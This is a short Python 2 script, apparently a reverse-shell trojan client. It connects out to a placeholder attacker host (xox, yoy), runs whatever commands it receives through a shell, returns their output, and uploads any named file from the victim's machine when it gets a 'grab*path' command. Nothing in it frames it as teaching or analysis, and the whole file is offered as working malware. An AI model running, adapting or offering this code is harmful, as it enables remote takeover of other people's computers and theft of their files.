import socket 
import subprocess 
import os         

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('Unable to find out the file')



def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((xox,yoy))
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


        elif 'grab' in command:            
            grab,path = command.split('*')
            
            try:                        
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) ) 
                pass


        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()











